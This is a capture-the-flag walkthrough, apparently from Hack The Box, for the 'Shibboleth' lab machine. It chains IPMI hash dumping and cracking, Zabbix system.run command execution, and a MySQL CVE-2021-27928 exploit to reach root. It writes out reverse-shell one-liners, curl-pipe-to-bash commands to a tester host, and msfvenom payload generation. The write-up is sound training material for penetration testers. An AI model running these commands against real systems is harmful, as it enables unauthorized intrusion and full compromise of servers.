@@ -1,0 +1,136 @@
+                        Shibboleth
+
+                                                                                            29th March 2022 / Document No
+                                                                            D22.100.164
+
+                                                                                            Prepared By: MrR3boot
+                                                                                            Machine Author(s): knightmare & mrb3n
+                                                                                            Difficulty: Medium
+                                                                                            Classification: Official
+
+Synopsis
+
+Shibboleth is a medium difficulty Linux machine featuring IPMI and Zabbix software. IPMI authentication is
+found to be vulnerable to remote password hash retrieval. The hash can be cracked and Zabbix access can
+be obtained using these credentials. Foothold can be gained by abusing the Zabbix agent in order to run
+system commands. The initial password can be re-used to login as the ipmi-svc and acquire the user flag.
+A MySQL service is identified and found to be vulnerable to OS command execution. After successfully
+exploiting this service a root shell is gained.
+
+Skills Required
+
+      Basic Network Knowledge
+      OWASP Top 10
+      Basic Linux Knowledge
+
+Skills Learned
+
+      IPMI Enumeration & Exploitation
+      Zabbix Exploitation
+      MySQL Exploitation
+
+Enumeration
+Enumeration
+
+Nmap
+
+Let's start with a port scan.
+   ports=$(nmap -p- --min-rate=1000 -T4 10.129.118.50 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.129.118.50
+
+Nmap reveals that there is only one port, HTTP (80), open. It is also clear that the server redirects us to
+shibboleth.htb . Let's add this to our hosts file and browse to this virtual host.
+
+   echo '10.129.118.50 shibboleth.htb' | sudo tee -a /etc/hosts
+
+The application is static other than the contact page. Let's browse to it.
+Attempts to send a contact request are unsuccessful as there are missing libraries.
+
+FFUF
+
+Lets enumerate files and folders using FFUF.
+
+   ffuf -u http://shibboleth.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt
+The results do not reveal anything interesting. Let's continue our enumeration by fuzzing for virtual hosts.
+
+   ffuf -u http://shibboleth.htb -H 'Host: FUZZ.shibboleth.htb' -w
+   /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18
+Fuzzing reveals three virtual hosts present, monitor , monitoring and zabbix . Let's add them to hosts file
+and browse one by one.
+
+   echo '10.129.118.50 monitor.shibboleth.htb monitoring.shibboleth.htb
+   zabbix.shibboleth.htb' | sudo tee -a /etc/hosts
+
+The above three virtual hosts redirect us to a Zabbix login page. Zabbix is an open source monitoring
+solution.
+Attempts at SQL Injection and guessing default credentials failed. Let's try to scan the UDP ports.
+   ports=$(sudo nmap --min-rate=5000 -sU 10.129.118.50 | grep open | grep ^[0-9] | cut -d
+   '/' -f 1 | tr '\n' ',' | sed s/,$//)
+   sudo nmap -sV -sC -p$ports -sU 10.129.118.50
+
+The scan found an open port 623 (asf-rmcp). The standard Intelligent Platform Management Interface
+protocol uses this port for RMCP connections. Searching for known vulnerabilities on IPMI protocol we find
+a blog post which shows detailed ways which we can attempt to gather information from this service. As a
+first step let's attempt to dump the password hashes for the users.
+
+Foothold
+
+Let's issue below commands to dump the hashes
+   msfconsole
+   use auxiliary/scanner/ipmi/ipmi_dumphashes
+   set RHOSTS 10.129.118.50
+   run
+
+The hash for user Administrator is retrieved. Let's save it in a file and use Hashcat to attempt to crack the
+hash.
+
+   echo -n
+   3c08a6bf020500008edc65459227db9e4de83261ee2eafe9429a07eb96d30b745fef6f821dd97d81a123456
+   789abcdefa123456789abcdef140d41646d696e6973747261746f72:80026d133489237175ee975d5dff53f
+   4c923b396 > hash
+   hashcat -m 7300 hash /usr/share/wordlists/rockyou.txt
+The hash was cracked successfully. It is now possible to list/create IPMI users but that's not helpful. We can
+try to re-use these credentials on Zabbix.
+This is successful. Browsing to User settings , the user privilege level is revealed.
+
+Reading through Zabbix documents, we find a blog post, which talks about executing remote commands
+through Zabbix agent using the system.run item. Navigate to Configuration > Hosts , click on
+shibboleth.htb host, then Configuration . To create an item we click on Items > Create Item option.
+Enter the below command in the Key field.
+
+   system.run[curl 10.10.14.13,nowait]
+Standup a listener on port 80. Click on Test button and then Get value option. This sends a request to
+our listener.
+We can now use this functionality to get a reverse shell on the system. Execute the following commands to
+create a reverse shell and standup a Python HTTP server to download the shell from the server.\
+
+   echo '/bin/bash -c "bash -i >& /dev/tcp/10.10.14.13/1234 0>&1"' > index.html
+   sudo python3 -m http.server 80
+Standup a listener on port 1234 and update Key field with below payload.
+   system.run[curl 10.10.14.13|bash,nowait]
+Clicking on Test > Get value will send us the reverse shell.
+
+Lateral Movement
+
+Having foothold on the system we can enumerate for the Zabbix configuration files.
+We see that the two configuration files are only readable by ipmi-svc user and root . Re-using the
+Administrator credential we can switch to ipmi-svc user and read the user flag.
+
+Privilege Escalation
+
+Enumerating the services that are running on system, we see that the MySQL service is running locally.
+
+The database credentials can be obtained from zabbix_server.conf file, which we can now access.
+We can login to MySQL server using the zabbix / bloooarskybluh credentials.
+
+From the banner it is found that the MySQL version is 10.3.25 which has a known command execution
+exploit. Let's generate a reverse shell payload.
+
+   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.13 LPORT=4444 -f elf-so -o CVE-
+   2021-27928.so
+Copy the file to the target machine. Now stand up a listener on port 4444 and issue the following command
+in the MySQL console to trigger the shell.
+   SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";
+This is successful and the shell as root is obtained on the listener. The flag can be found in /root .
+
